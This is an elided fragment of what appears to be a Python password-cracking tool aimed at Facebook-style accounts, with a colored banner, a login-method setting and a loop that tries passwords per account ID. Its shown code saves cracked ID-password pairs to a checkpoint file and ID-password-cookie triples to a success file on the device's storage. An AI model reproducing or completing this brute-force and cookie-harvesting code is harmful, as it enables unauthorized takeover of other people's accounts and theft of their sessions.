...
\033[1;37;1m-----------------------------------------------
 ...
 VERSION    : \033[1;36m1.0 \033[1;37m
-----------------------------------------------"""   
meyermarexudi =("""""")    
...
def setting():
    ...
    if hc in ['1','01']:
        ...
        method.append('mobile')
    saureeu = input(' \033[1;37m[\u001b[36m•\033[1;37m] Show Cp Account (y/n) : ')     
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():              
                open('/sdcard/Dada-CP.txt', 'a').write(idf+'|'+pw+'\n')
                if 'y' in cpp:
                ...
                open('/sdcard/Dada-OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                if 'y' in cooki:
